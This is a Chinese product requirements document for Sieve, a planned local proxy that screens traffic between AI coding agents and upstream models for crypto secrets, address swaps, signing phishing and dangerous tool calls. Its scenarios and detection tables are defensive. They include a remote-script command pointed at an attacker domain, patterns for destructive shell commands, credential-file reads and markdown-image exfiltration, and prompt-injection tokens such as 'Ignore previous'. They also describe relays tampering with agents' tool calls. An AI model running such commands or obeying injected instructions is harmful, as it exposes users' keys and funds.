# Sieve 产品需求文档 v1.3

> **codename: Sieve**(产品正式名待定)
> 文档版本: v1.3 / 2026-04-26
> 文档主人: doskey
> 状态: 第一性原理 + 合规边界修订版,锁定执行
> 与 v1.2 差异: 8 条来自 GPT-5.5 review 的改动,核心是中国大陆合规边界 + 自证清白叙事提层

---

## 0. v1.3 修订说明

v1.2 是第一性原理推导版本。v1.3 在 v1.2 基础上做了 8 条改动,核心是:

1. **新增中国大陆合规边界**——v1.2 完全没考虑,这是会卡住执行的硬约束
2. **"自证清白"从工程细节提到产品定位**——sigstore + 透明日志是营销 talking point,不只是工程实现
3. **数据标注稀缺性**作为"先规则后模型"的核心论证
4. **闭测画像精确化** + benchmark 数据集大小具体化
5. **数据侧伙伴接洽清单**(SlowMist / ScamSniffer / GoPlus / Chainabuse)
6. **MCP 拦截放进 Phase 2**(Claude Code 的真实威胁面)
7. **用户教育成本**作为风险登记

### v1.2 → v1.3 改动汇总


| 改动                 | 章节             | 来源                |
| ------------------ | -------------- | ----------------- |
| 中国大陆合规边界           | §1.4, §11.5 新增 | GPT-5.5 review #1 |
| "自证清白"提到核心叙事       | §1.2 加第 4 句    | GPT-5.5 review #2 |
| 单人团队数据标注稀缺性论证      | §6.2           | GPT-5.5 review #3 |
| 具体 benchmark 数据集大小 | §10.1 Week 4   | GPT-5.5 review #4 |
| 闭测画像精确化            | §10.2 Week 9   | GPT-5.5 review #5 |
| 数据侧伙伴接洽清单          | §13 新增表        | GPT-5.5 review #6 |
| MCP 拦截放进 Phase 2   | §5.2           | GPT-5.5 review #7 |
| 用户教育成本风险           | §12            | GPT-5.5 review #8 |


---

## 1. 产品定位

### 1.1 一句话

**Sieve 是一个完全本地运行的 LLM 流量代理,在 AI 编码 agent 和上游模型之间做双向安全检测,服务于 crypto 开发者和 DeFi 重度用户,在不可逆动作(签名/转账/部署)前强制插入认知摩擦,防止私钥泄漏、地址替换、危险工具调用导致的资产损失。**

### 1.2 四句话核心叙事(v1.3 加第 4 句)

1. **上游不可信**:你用的中转站可能在改你的 tool_call,官方 API 出问题不会赔你私钥被盗的钱
2. **没人能替你兜底**:钱包安全产品看不见你的 prompt,LLM 安全产品不懂 crypto,DLP 不在你工作流里
3. **Sieve 在客户端最后一道闸**:完全本地运行,字节流双向扫描,从不上传你的数据
4. **🆕 你不只是相信我们,你能验证我们**:开源核心引擎、sigstore 签名、可复现构建、透明规则更新日志——Sieve 自己被同一套标准审视,绝不成为新的供应链风险

### 1.3 不是什么

- 不是中转站,不路由不调度
- 不是 LLM Gateway,不给企业管理多 LLM
- 不是钱包,不存私钥不签交易
- 不是审计公司,不出审计报告
- 不是云 SaaS,不收集 prompt

### 1.4 项目性质 + 法律实体(v1.3 修订)

- **个人项目**,以 doskey 个人品牌背书
- **不融资,不招人,不做企业销售**
- 18 个月 MRR 目标 ≥ $25K(年化 $300K)
- 24 个月稳态 MRR 目标 $50K-75K(年化 $600K-900K)
- 追求一人公司财务自由 + 个人 IP 转型,不追求独角兽

**🆕 法律实体明确**:

- **海外注册**——不是"待定",是必须。**首选香港有限公司或新加坡 Pte Ltd**,次选美国 Stripe Atlas
- 推导依据:见 §11.5 中国大陆合规边界
- 收款渠道:Stripe + 加密支付双通道(Crypto 圈用户偏好后者)

---

## 2. 市场判断与时间窗

### 2.1 时机

- **2026-04 UCSB+Fuzzland 论文**(*Your Agent Is Mine*, arXiv:2604.08407)首次系统证实威胁
- **2026-03 LiteLLM 供应链事件** 证明"上游不可信"不是理论
- 市场认知刚被点燃,产品化解决方案空缺

### 2.2 窗口期

- **6-12 个月**:GoPlus AgentGuard 升级到 LLM 流量层
- **12-18 个月**:Blockaid 推 Coding Agents 版
- **18-24 个月**:主流钱包默认集成,Sieve 失去一半价值

**12 周 GA 是窗口期内最快的合理执行节奏**——短于 12 周质量保不住,长于 12 周窗口可能开始关。

### 2.3 真护城河(四点)

1. **LLM 流量层位置**(独占)
2. **完全本地零云依赖**(LLM Guard 之外只有我)
3. **Crypto 专项检测**(19 家 LLM/DLP 全无,9 家 AI Agent 安全工具全无)
4. **双向检测 + fail-closed**(钱包安全产品看不到 prompt)

---

## 3. 用户画像

### 3.1 P0 客群:Crypto-native AI 重度开发者

- 用 Claude Code / 自写 agent 写代码 ≥ 4 小时/天
- 工作涉及智能合约、DeFi 协议、钱包前端、交易脚本、跨链桥
- 持有 $10K+ crypto 资产,部分 $100K-$10M
- 同时使用 OpenAI / Anthropic / OpenRouter / 国内中转站
- 付费意愿:**$49/月无感**
- **🆕 地理分布:海外为主**(欧美 / 东南亚 / 港台),中文圈 dev 但居住海外

### 3.2 P1 客群:智能合约开发者 + 协议团队成员

- DeFi 协议开发者、bug bounty hunter、合约审计师
- 单笔工作潜在金额 $100K-$100M
- 用 AI 辅助写/审计 Solidity / Vyper / Move / Rust 合约
- 付费意愿:**$49/月**,公司报销

### 3.3 不服务的客群

- ❌ **企业 CISO**——Nightfall/Lakera 主场,与一人项目调性不符
- ❌ **Crypto 散户**——不写代码,用钱包扩展即可
- ❌ **国内政企**——奇安信/深信服市场,合规复杂
- ❌ **纯 web2 程序员**(无 crypto 资产)——付费意愿不足以支撑误报治理成本
- ❌ **🆕 中国大陆境内的公开 to-C 商业化**——见 §11.5,营销渠道分级处理

---

## 4. 核心用户场景

### 4.1 场景 A:出站防泄漏

```
用户:Claude Code,debug 跨链转账脚本,paste 整个 .env
Sieve:拦截,确认窗口
       ┌──────────────────────────────────────┐
       │ ⚠ Sieve 检测到敏感内容             │
       │                                      │
       │ • 1 个 Ethereum 私钥(64 hex)       │
       │ • 1 个 Infura API key                │
       │ • 1 个 BIP39 助记词(SHA-256 校验通过)│
       │                                      │
       │ [脱敏后发送] [取消] [允许此次]      │
       └──────────────────────────────────────┘
```

### 4.2 场景 B:入站防地址替换

```
用户:让 Claude 写转账到 0x742d35...1234A
模型返回:代码里地址是 0x742d35...1234B(中转站偷改末位)
Sieve:对比对话历史,标红警告
       ┌──────────────────────────────────────┐
       │ 🚨 检测到地址替换攻击                │
       │                                      │
       │ 你 prompt:....1234A                  │
       │ 模型输出:....1234B (差异 1 字符)    │
       │                                      │
       │ [中止] [手动核对继续]                │
       └──────────────────────────────────────┘
```

### 4.3 场景 C:入站防危险工具调用(YOLO mode 救命)

```
用户:Claude Code YOLO 模式,让模型清理临时文件
模型返回:tool_use bash("curl https://attacker.com/cleanup.sh | sh")
Sieve:fail-closed,即使 YOLO mode 也强制人工确认
       ┌──────────────────────────────────────┐
       │ 🚨 高风险工具调用被阻断              │
       │                                      │
       │ tool: bash                           │
       │ command: curl https://attacker.com/...│
       │                                      │
       │ 风险:远程脚本下载并执行              │
       │ 域名不在白名单                       │
       │                                      │
       │ [拒绝] [我确认这是安全的]            │
       └──────────────────────────────────────┘
```

### 4.4 场景 D:入站防签名钓鱼

```
用户:让模型帮写 Permit 签名调用
模型返回:tool_use signTypedData({...}),verifyingContract 是数字化的 996101...
Sieve:fail-closed,显示完整 typed data + 解析 verifyingContract
       ┌──────────────────────────────────────┐
       │ 🚨 可疑签名调用                      │
       │                                      │
       │ verifyingContract: 996101...         │
       │ → 转换为 0x: 0xF35...                │
       │ → 不在已知协议白名单                 │
       │ → 已知 drainer 模式: 数字化绕过      │
       │                                      │
       │ [拒绝] [我已核对完整内容]            │
       └──────────────────────────────────────┘
```

---

## 5. 功能需求

### 5.1 出站检测

#### Phase 1 P0(MVP 第 1-2 周)


| ID     | 检测项                        | 算法核心                          | Critical FP 上限            |
| ------ | -------------------------- | ----------------------------- | ------------------------- |
| OUT-01 | OpenAI / Anthropic API key | 前缀 + entropy + 占位符黑名单         | < 0.1%                    |
| OUT-02 | AWS Access Key             | `AKIA[0-9A-Z]{16}` + 排除官方示例   | < 0.1%                    |
| OUT-03 | GitHub Token               | 前缀 + CRC32 校验                 | < 0.05%                   |
| OUT-04 | JWT                        | 三段 base64 + header 解码验证       | < 0.5%                    |
| OUT-05 | RSA/Ed25519/SSH 私钥         | PEM 头部精确匹配                    | < 0.01%                   |
| OUT-06 | Ethereum 私钥(64 hex)        | regex + entropy + 上下文关键词      | < 1%(只能 High,不上 Critical) |
| OUT-07 | Bitcoin WIF                | base58 + 双 SHA-256 校验位        | < 0.001%                  |
| OUT-08 | Solana 私钥                  | base58 88 字符或 hex 64 字节       | < 1%                      |
| OUT-09 | **BIP39 助记词**              | **词表 + SHA-256 校验**(差异化点)     | < 0.05%                   |
| OUT-10 | Keystore JSON              | Web3 Secret Storage v3 schema | < 0.01%                   |
| OUT-11 | .env 文件特征                  | 多行 KEY=VALUE 密度阈值             | < 5%(只 Medium)            |
| OUT-12 | 数据库连接串                     | URI scheme + 用户名密码字段          | < 0.5%                    |


#### Phase 2(GA 后逐步加)

- 中文 PII(身份证 / 银行卡 / 统一信用代码)
- 内网域名 / 内部代号(用户自定义)
- 长代码块识别 + Copyright 提示
- 自定义规则 DSL

#### 出站交互模式

- **拦截**(Critical):阻断,要求脱敏后重发或允许此次
- **脱敏**:自动用 `[REDACTED-PRIVATE-KEY]` 占位符
- **学习型白名单**:`.sieveignore` 文件,fingerprint = `rule_id:sha256_prefix`

---

### 5.2 入站检测——Sieve 真正的护城河

#### Phase 1 P0:Crypto 钩子(MVP 第 3-4 周)


| ID       | 检测项                    | 算法核心                                                                                                  |
| -------- | ---------------------- | ----------------------------------------------------------------------------------------------------- |
| IN-CR-01 | **地址替换检测**             | 维护对话历史所有 `0x[a-fA-F0-9]{40}`,新输出地址比对:相同放行 / 前 N 后 M 匹配标红 / Levenshtein ≤ 4 标黄                         |
| IN-CR-02 | 危险工具调用拦截               | tool_use 结构化分析:`bash` 含 `rm -rf` / `curl..|sh` / `eval(base64..)` / `sudo`                            |
| IN-CR-03 | 敏感路径访问                 | 参数包含 `~/.ssh/`、`~/.aws/`、`/etc/shadow`、`.env`、`*.keystore`、`~/.config/solana/`                        |
| IN-CR-04 | 持久化机制                  | tool_use 写 `crontab`、`launchd`、`systemd`、`.bashrc`、`.zshrc`                                           |
| IN-CR-05 | **签名工具调用 fail-closed** | `eth_sendTransaction` / `signTransaction` / `signMessage` / `signTypedData` 全部强制弹窗,**YOLO mode 不可关闭** |


#### Phase 1 P0:通用入站(MVP 第 4-5 周)


| ID        | 检测项                 | 算法核心                                                      |
| --------- | ------------------- | --------------------------------------------------------- |
| IN-GEN-01 | 危险 shell 模式         | `rm -rf /`、fork bomb、`> /dev/sda`、`dd if=/dev/zero`       |
| IN-GEN-02 | 远程脚本执行              | `curl X | sh`、`wget X | bash`、`bash <(curl X)`            |
| IN-GEN-03 | 编码后执行               | `eval(base64.b64decode(...))`、`exec(__import__('os')...)` |
| IN-GEN-04 | Markdown 图片 exfil   | `![](http://X.com/?Y=Z)` + 域名不在白名单                        |
| IN-GEN-05 | Prompt injection 反向 | `<|im_start|>`、`[INST]`、`### System:`、`Ignore previous`   |


#### Phase 2(GA 后逐步加)

- npm / pip typosquat 检测
- Markdown 链接钓鱼
- Unicode 攻击防御(NFC + 控制字符黑名单)
- Calldata 静态解码(4byte 离线 SQLite)
- ERC20 危险 approve(approve(MAX) / setApprovalForAll)
- EIP-2612 / EIP-7702 滥用
- Drainer 黑名单(Chainabuse + ScamSniffer 集成)
- 协议白名单
- Solidity 后门检测(Slither)
- **🆕 MCP server 调用拦截 + scope-aware policy**(IN-MCP-01~03,Week 16-20)
  - IN-MCP-01:不在用户 allowlist 的 MCP server 调用强制确认
  - IN-MCP-02:MCP tool 参数包含敏感关键字时拦截
  - IN-MCP-03:MCP server 输出注入下游 prompt 的反向利用检测
  - **理由**:Claude Code 大量使用 MCP,Anthropic 官方明确警告第三方 MCP 服务器存在 prompt injection 风险

### 5.3 处置矩阵


| 等级          | 默认行为                                   | 用户可见  |
| ----------- | -------------------------------------- | ----- |
| 🚨 Critical | **Inline block + 强制确认**,YOLO mode 不可关闭 | 全屏告警  |
| ⚠ High      | Non-blocking warn + 5 秒倒计时             | 弹窗    |
| 📋 Medium   | 标记 + 日志                                | 状态栏图标 |
| ℹ Low       | 静默记录                                   | 无     |


**Critical 在所有版本不可关闭。这是产品安全承诺,不是用户偏好。**

---

## 6. 技术架构

### 6.1 Phase 1 单 agent 架构(只 Claude Code)

```
┌────────────────────────────────────────────────────┐
│  Claude Code                                        │
│        ↓ ANTHROPIC_BASE_URL=http://127.0.0.1:11453 │
└────────────────────┬───────────────────────────────┘
                     ↓
┌────────────────────────────────────────────────────┐
│  Sieve 本地代理(Rust 单二进制)                     │
│                                                      │
│  ┌──────────────────────────────────────────────┐  │
│  │ Protocol Layer                                │  │
│  │  └ Anthropic Messages API + SSE              │  │
│  │  └ 内部表示:UnifiedMessage(预留三家扩展)   │  │
│  └──────────────────────────────────────────────┘  │
│                     ↓                                │
│  ┌──────────────────────────────────────────────┐  │
│  │ Outbound Filter Pipeline                      │  │
│  │  ├ vectorscan 多模式正则(SIMD)              │  │
│  │  ├ entropy / 校验位 / 上下文关键词           │  │
│  │  └ 占位符黑名单 + .sieveignore               │  │
│  └──────────────────────────────────────────────┘  │
│                     ↓                                │
│  ┌──────────────────────────────────────────────┐  │
│  │ Upstream Forwarder(reqwest + rustls)         │  │
│  │  → api.anthropic.com / 中转站                 │  │
│  └──────────────────────────────────────────────┘  │
│                     ⇅                                │
│  ┌──────────────────────────────────────────────┐  │
│  │ Inbound Filter Pipeline(SSE 流式)            │  │
│  │  ├ SSE Parser + partial-json-parser          │  │
│  │  ├ vectorscan stream mode                    │  │
│  │  ├ Tool Use Aggregator                       │  │
│  │  ├ AddressGuard                              │  │
│  │  └ Critical 拦截 / High 二次确认 / Medium 标记│  │
│  └──────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────┘
```

### 6.2 关键技术决策(v1.3 强化论证)

**Phase 1 不引入 ONNX / 本地小模型,纯规则引擎**——这个决定不是简化,是必需。三个独立的论证:

1. **结构化优先**:编码代理中的高风险事件往往是结构化的——私钥形态、BIP39 助记词、地址、EIP-712、函数 selector、危险 shell/tool 调用,**都比泛文本更适合可解释规则**。规则引擎在结构化场景下的精度 + 可解释性,模型给不了。
2. **误报敏感**:开发者对误报极其敏感。GitHub secret scanning 演进史已经说明:**生产可用的检测通常依赖模式 + validity checks + 定制规则**,逐步扩展,而不是全部押在分类器上。这条规律对个人开发者群体放大 10 倍。
3. **🆕 单人团队最稀缺的资源**:不是算力,是**持续标注高质量 benign/malicious 会话的能力**。本地小模型的精度天花板取决于训练数据质量,而 doskey 一个人扛不动这个标注流程。规则引擎绕开了这个瓶颈——规则可以靠 doskey 一个人 + Claude Code 持续维护。

**结论**:Phase 2 视用户实际误报率决定是否引入二阶段轻量模型作为补充层,Phase 1 完全不碰。

### 6.3 Rust 技术栈


| 用途                   | 选型                             | 理由                    |
| -------------------- | ------------------------------ | --------------------- |
| HTTP 服务 + 反向代理       | `hyper 1.x` + `tokio`          | Cloudflare Pingora 同源 |
| TLS                  | `rustls`                       | 纯 Rust                |
| 多模式正则                | `vectorscan-rs`                | 比 Go regexp 快 1000+ 倍 |
| JSON 流式解析            | `sonic-rs` + 自研 partial parser | SIMD 加速               |
| 客户端 HTTP             | `reqwest`                      | 调上游                   |
| 配置                   | `serde` + `toml`               | 标配                    |
| SQLite               | `rusqlite`                     | 审计日志 + license        |
| 哈希 / 校验              | `sha2` / `crc32fast`           | 校验位                   |
| BIP39 / base58 / hex | `bip39` / `bs58` / `hex`       | 加密原语                  |


### 6.4 性能预算


| 操作                | 目标延迟        |
| ----------------- | ----------- |
| 普通 token 流式 chunk | +30-200 µs  |
| 工具调用边界完整检查        | +5-15 ms    |
| 整体 P99 添加延迟       | **< 20 ms** |
| 内存峰值              | < 100 MB    |
| 二进制大小             | < 20 MB 单文件 |
| 启动时间              | < 500 ms    |


### 6.5 误报率预算


| 检测类型     | Critical 拦截 FP 上限              | High Warn FP 上限 |
| -------- | ------------------------------ | --------------- |
| OUT-*    | < 0.5%(单条 Critical 各自上限见 §5.1) | < 5%            |
| IN-CR-*  | < 0.5%                         | < 3%            |
| IN-GEN-* | N/A(全部 High 及以下)               | < 10%           |


**超过这个数 → 用户禁用产品**。这是公理 12 的硬约束,不是工程优化项。

### 6.6 部署形态(Phase 1)

- **CLI / 后台进程**——主要分发形态
- `brew install sieve` / GitHub Releases 二进制下载
- 配置 `~/.sieve/config.toml` + 环境变量
- **不做** 桌面 App / VS Code 插件——Phase 2

---

## 7. 商业模式与定价

### 7.1 单一定价


| 阶段         | 价格                        | 内容                                 |
| ---------- | ------------------------- | ---------------------------------- |
| **14 天试用** | $0                        | 全功能                                |
| **正式版**    | **$49/月**(年付 $490,省 2 个月) | 全功能                                |
| **降级模式**   | $0                        | 试用结束未付费的用户:**只读警告**,不再 Critical 拦截 |


### 7.2 收入预期

**12 个月**:

- 试用用户:5,000(累计)
- 转化率:3-5%
- 付费用户:200 × $49 = **$9,800/月,$118K ARR**

**18 个月**:

- 付费用户:500 × $49 = **$24,500/月,$294K ARR**

**24 个月稳态**:

- 付费用户:1,200 × $49 = **$58,800/月,$706K ARR**

ARR 上限估计 $500K-1M。

### 7.3 不做的商业动作

- ❌ 不融资
- ❌ 不招人(Phase 1-3 全部 doskey 一人 + Claude Code)
- ❌ 不做企业销售
- ❌ 不做 ads
- ❌ 不转售用户数据
- ❌ 不做付费咨询
- ❌ 不做团队版 / Enterprise 版(等真有 5+ 客户主动问再说)

---

## 8. 数据飞轮与威胁情报

### 8.1 简化版

- 用户在 GitHub issue 公开提交可疑样本(不通过产品上传)
- doskey 自己定期采样测试中转站(参考 UCSB 论文方法论)
- bounty 业务副产品自然转化为规则

### 8.2 第三方采购(分阶段)


| 数据源                      | 内容              | 成本     | 阶段       |
| ------------------------ | --------------- | ------ | -------- |
| 自维护规则集                   | 内置              | $0     | Phase 1  |
| Chainabuse 免费 API        | 钱包黑名单           | $0     | Phase 2  |
| ScamSniffer 7 天延迟开源      | drainer 合约      | $0     | Phase 2  |
| GoPlus 免费 Token API      | 风险代币            | $0     | Phase 2  |
| ScamSniffer Pro realtime | 实时 drainer feed | $999/月 | 第 12 个月起 |


### 8.3 规则更新

- 每周签名文件下载,Ed25519 签名验证
- 客户端只下载,不上传
- 静态资源更新可关闭,完全离线可用

---

## 9. 工程上必须做对的硬约束

每条都是"做错就死",不是优化项:

1. **Rust 栈非选项**——Go regexp 慢 1000 倍
2. **绝不做联网 verifier**——发送 token 到外部验证 = 摧毁产品定位
3. **fail-closed High-Risk Tool Policy Gate + 强制确认**——YOLO mode 不允许关闭
4. **BIP39 必须做 SHA-256 checksum 验证**——这是 Sieve 的差异化点
5. **SSE 边界处理写大量 fuzz test**——半行 chunk、跨 chunk 分隔符、嵌入 C0 控制字符、多 event 粘包、提前断流必须全部覆盖
6. **Sieve 自身的供应链必须 sigstore + reproducible build + pinned dependencies**——LiteLLM 事件就是先例。**这件事比检测精度重要,且要做成产品营销 talking point**(见 §1.2 第 4 句)
7. **Critical 拦截 FP 必须 < 0.5%**——公理 12,不可妥协
8. **Critical 在所有版本(包括降级模式之前)不可关闭**——产品安全承诺
9. **Phase 1 只做 Claude Code,UnifiedMessage 接口预留**——公理 7,不为想象用户写代码
10. **Day 1 GitHub repo 公开 README + 架构文档,代码 GA 后开源**——平衡信任叙事和叙事控制力

---

## 10. 12 周里程碑(8 周 dogfood + 4 周闭测)

### 10.1 Phase A:dogfood 阶段(Week 1-8)

#### Week 1:基础设施 + Anthropic 协议

- Rust 项目骨架,hyper + tokio + rustls 跑通
- 透明转发 Anthropic Messages API + SSE
- UnifiedMessage 内部 schema(Anthropic only,接口预留)
- **GitHub repo 公开**(只 README + 架构文档,代码私有)
- **🆕 sigstore 签名 pipeline + GitHub Actions reproducible build pipeline 必须 Week 1 跑通**——这是 §1.2 第 4 句的物质基础

**完成定义**:doskey 自己用 Claude Code,设 base_url,所有日常操作正常

#### Week 2:出站 P0

- vectorscan-rs 多模式正则集成
- OUT-01~12 全部 P0 出站规则
- BIP39 SHA-256 checksum 验证
- 占位符黑名单 + .sieveignore
- 单元测试覆盖 ≥ 80%

**完成定义**:paste .env 触发拦截,标准 secret benchmark FP < 1%, Recall > 70%

#### Week 3:入站 Crypto 钩子

- SSE Parser + Tool Use Aggregator
- IN-CR-01 地址替换检测
- IN-CR-05 签名工具 fail-closed
- 大量 fuzz test 覆盖 SSE 边界

**完成定义**:复现 UCSB 论文 4 类攻击 PoC,Sieve 全部捕获

#### Week 4:入站通用 + 危险 tool call + benchmark 数据集

**🆕 v1.3 修订:本周必须完成 benchmark 数据集**

- IN-CR-02~04 危险路径 + 持久化
- IN-GEN-01~05 全部 P0
- 处置矩阵完整实现
- CLI 弹窗 + 命令行确认
- **🆕 benchmark 数据集**:
  - **200-500 条合成攻击样本**——覆盖 UCSB 论文 4 类攻击 + 已知 drainer 模式 + Pink Drainer 数字化绕过 + npm typosquat + curl|sh + eval base64
  - **50-100 条真实 benign 会话回放**——doskey 自己日常 Claude Code 工作录制
  - **canary 测试**:假 BIP39 助记词、假地址、假 selector、假 .env(用 honeypot 钱包私钥)
  - **目标**:Critical FP < 0.5%, High FP < 5%

**完成定义**:benchmark 数据集跑通,所有 Critical 规则达到 FP 阈值

#### Week 5:打磨 + 配置 + 文档

- 完整配置系统
- 日志和审计输出(本地 SQLite append-only)
- 完整用户文档(只 Claude Code 接入教程)
- License 验证 + 14 天试用机制
- brew tap + GitHub Releases

**完成定义**:doskey 朋友 30 分钟内能 brew install + 配好

#### Week 6:doskey 自用 + 修 bug

- doskey 自己 100% 时间用 Sieve 工作
- 收集所有 false positive,加 .sieveignore 默认条目
- 性能 benchmark 验证 P99 < 20ms
- Windows / Linux 二进制(macOS 是主战场)

**完成定义**:doskey 自己一周无 P0 bug,FP 触发次数 < 5 次

#### Week 7-8:高强度 dogfood

- doskey 一直用,刻意尝试各种 edge case
- 每次 FP 都进 issue 列表 + 修
- 第一次签名规则库下发测试
- Stripe 接入 + license key 系统(海外公司账号)

**完成定义**:doskey 用 Sieve 跑 2 周,无 P0 / P1 bug

---

### 10.2 Phase B:闭测阶段(Week 9-12)

#### Week 9:闭测启动(v1.3 修订:画像精确化)

**🆕 闭测画像必须满足**:

- **5-10 个海外 crypto dev**——优先满足以下三类身份:
  - **高频 hackathon builder**(ETHGlobal / Solana / 各 L2 自己的 hackathon 常客)——时间紧、必用 AI、写代码量大、单次 hackathon 可能写 10+ 合约
  - **bug bounty hunter / 审计研究员**(Code4rena / Sherlock / Immunefi 活跃用户)——最懂攻击模式,最会找产品 bug
  - **小团队 protocol engineer**(< 10 人 protocol team)——决策快,口碑传播力强
- **不要找**:大企业开发者(决策慢)、纯 web2 友人(画像不匹配)、纯 KOL(用户不深度)

**Week 9 具体动作**:

- 个人邀请 5 人,提供专属 license key
- 建立 Discord 闭测频道
- 每天处理反馈

#### Week 10:闭测 + 内容准备

- 修闭测发现的 bug
- 起草 3 篇引爆文章:
  - 文章 1:中转站揭黑(实测复刻 UCSB 论文方法论)
  - 文章 2:**🆕 自证清白:Sieve 怎么证明自己不是新的 LiteLLM**(技术深度 + 营销弹药)
  - 文章 3:Pink Drainer 攻击复盘 + Sieve 怎么防

**🆕 文章 2 的战略意义**:把 §1.2 第 4 句的核心叙事用一篇文章讲透,后续所有营销围绕这个 talking point

#### Week 11:闭测扩大 + KOL 接洽

- 邀请 5 个新闭测用户(同样的画像标准)
- 准备 landing page(英文为主,中文次之)
- **🆕 KOL 接洽优先级**:
  - **数据合作优先于内容合作**——参见 §13 数据侧伙伴清单
  - 第一目标:Chaofan Shou (@Fried_rice) 顾问关系
  - 第二目标:慢雾 @evilcos misttrack-skills 数据合作

#### Week 12:GA 发布

- **代码开源(MIT)** + 二进制签名验证
- landing page 上线
- 文章 1 + 2 同步发(中转站揭黑 + 自证清白)
- 14 天试用全面开放
- Stripe 收款上线

**完成定义**:GA 第一周 GitHub stars > 200,试用注册 > 100,首批付费用户 ≥ 10

---

### 10.3 Phase C:慢节奏维护(Week 13+)

每周稳定投入 5-10 小时:

- 每月一篇深度内容
- 用户反馈处理 + bug 修复
- 规则库每周更新一次
- 季度大版本(Phase 2 功能逐项上)
- **第二个用户主动要 OpenClaw / Hermes / MCP 适配时再做**

---

## 11. 法律与合规边界

### 11.1 不承诺

- 不承诺 100% 检测率
- 不承诺对未知 0day 攻击有效
- 不承诺对 APT 级攻击有效

### 11.2 ToS

- 用户使用不构成法律免责
- 不存储、不传输、不分析 prompt 内容
- 规则库更新仅下载,不上传
- 用户提交样本仅在 GitHub issue 公开渠道

### 11.3 开源策略

- **核心引擎 Week 12 GA 后开源(MIT)**
- Phase 2 高级规则集闭源
- 二进制 sigstore 签名 + reproducible build
- **🆕 透明更新日志**:每次规则更新发布 changelog + 哈希,用户可独立验证

### 11.4 商标

- codename Sieve,Week 6-8 之间换成正式名
- 已知冲突:sieve.ai (YC W22)、SIEVE 缓存算法、Thunderbird Sieve

### 11.5 🆕 中国大陆合规边界(v1.3 新增)

这是 v1.2 完全漏掉的关键约束。doskey 在国内 → 必须严格隔离三件事:

#### 11.5.1 公司主体与收款

- **公司必须海外注册**:首选香港有限公司或新加坡 Pte Ltd
- **Stripe 账号绑定海外公司**——Stripe 不接受大陆个人/个体户作为收款主体
- **加密支付备选通道**:USDC/USDT 收款(Crypto 圈用户偏好)
- doskey 个人在国内的纳税义务由海外公司分红时单独处理,不影响 Sieve 业务运营

#### 11.5.2 营销渠道分级

中国大陆监管对虚拟货币业务、信息中介、定价、导流、互联网展示**继续维持高压**。doskey 个人发声有约束。


| 渠道                                                   | 风险等级                                         | 内容策略                                                            |
| ---------------------------------------------------- | -------------------------------------------- | --------------------------------------------------------------- |
| **Twitter (英文为主)**                                   | 低                                            | **首发主战场**——可大量发"我用 honeypot 钱包测试中转站"、"Drainer 复盘"、"crypto 资产保护" |
| **Hacker News / Reddit r/ethdev / r/cryptocurrency** | 低                                            | 文章 1 + 2 + 3 同步,英文                                              |
| **Mirror / Substack 英文 blog**                        | 低                                            | 主要内容平台                                                          |
| **GitHub README**                                    | 低                                            | 英文为主,中文翻译次之                                                     |
| **即刻**                                               | **中**——只发"AI 安全研究"角度,**不直接发"crypto 资产防护"叙事** | 不做导流文案,不附 landing page 链接                                       |
| **V2EX**                                             | **中**——同上                                    | 同上                                                              |
| **微信公众号**                                            | **高**——避免发                                   | 不在主要营销规划                                                        |
| **小红书 / 知乎 / B 站**                                   | **高**                                        | 不规划                                                             |
| **国内 Crypto 社群(Telegram 中文群除外)**                     | **极高**                                       | 不主动营销                                                           |


**核心原则**:**境内渠道发研究内容,境外渠道发产品营销**。doskey 个人在国内的存在不要把"卖 crypto 工具"和"做安全研究"两件事混在一起公开讲。

#### 11.5.3 数据本地化

- Sieve 完全本地运行 + 不上传 prompt → 不触发数据出境合规
- 规则库下发是单向静态文件 + 签名验证 → 不构成"个人信息处理"
- 用户提交样本仅在 GitHub issue 公开渠道 → 用户主动行为,不在 Sieve 责任范围
- **绝不做**:产品内"一键提交样本"功能(会触发个人信息合规)、产品内中文社区(增加监管面)

#### 11.5.4 doskey 个人风险评估

**doskey 在国内身份做这件事的风险等级**:**低-中**。理由:

- 不向境内公众提供生成式 AI 服务 → 不在《生成式人工智能服务管理暂行办法》直接适用范围
- 不从事虚拟货币业务 → Sieve 是"为开发者提供的安全工具",不涉及交易 / 兑换 / 中介
- 不在境内做营销和导流 → 避开 §11.5.2 高风险渠道

**红线**:

- ❌ 不在国内做 crypto 培训 / 群运营 / 直播
- ❌ 不在国内推荐具体钱包/交易所/项目
- ❌ 不在国内公开宣称"用我的工具帮你赚钱"
- ❌ 营销文案不暗示"获利",只说"防损失"

**积极动作**:

- ✅ 海外公司主体 + Stripe / 加密支付双通道
- ✅ Twitter 英文为主战场
- ✅ doskey 个人未来如果家人移居海外,Sieve 业务可平滑迁移

---

## 12. 风险登记册


| 风险                            | 概率  | 影响  | 缓解                                                       |
| ----------------------------- | --- | --- | -------------------------------------------------------- |
| GoPlus AgentGuard 升级到 LLM 流量层 | 高   | 中   | 抢先发 + 公理 12 信任壁垒                                         |
| Blockaid 推 Coding Agents 版    | 中   | 中   | 完全本地 + Crypto 专项深                                        |
| Sieve 自身被供应链攻击                | 低   | 极高  | sigstore + reproducible + pinned + §1.2 第 4 句营销          |
| Critical 拦截 FP 失控             | 中   | 极高  | §5.1 单条 FP 上限 + dogfood 8 周 + 闭测 4 周                     |
| 误报率失控用户流失                     | 中   | 高   | 三级置信度 + .sieveignore + 持续 benchmark                      |
| 中转站爆料引法律纠纷                    | 中   | 中   | honeypot 钱包 + 学术方法论引用 + 部分匿名化                            |
| doskey 个人时间不够                 | 中   | 高   | 12 周冲完转慢节奏                                               |
| Crypto 圈 KOL 不买账              | 中   | 中   | Week 11 闭测时主动邀请 + 数据合作优先                                 |
| Anthropic 自己出 SDK             | 低   | 高   | 利益冲突,他们不会做"防中转站"                                         |
| **🆕 中国大陆监管收紧**               | 中   | 高   | §11.5 海外公司 + 渠道分级 + doskey 个人红线                          |
| **🆕 用户教育成本(中间层抗拒)**          | 高   | 中   | 文章 1 直接讲 LiteLLM 事件 + 中转站测试,把"信任 API"假设打破                |
| **🆕 海外公司注册周期延误**             | 中   | 中   | Week 1 启动注册流程,香港 / 新加坡 4-6 周可拿到执照,赶得上 Week 7-8 Stripe 接入 |


---

## 13. 与 doskey 其他业务的咬合 + 数据合作清单

### 13.1 业务咬合


| 业务                   | 咬合点                                              |
| -------------------- | ------------------------------------------------ |
| **AI 智能合约审计 bounty** | bounty 工作发现的攻击模式直接沉淀为 Sieve 规则,反向喂养              |
| **YoctoClaw**        | 第二个用户场景,Phase 2 深度集成                             |
| **个人品牌**             | 12 周 GA + 3 篇引爆文章 = 从"管理者"翻篇成"AI × Crypto 安全研究者" |


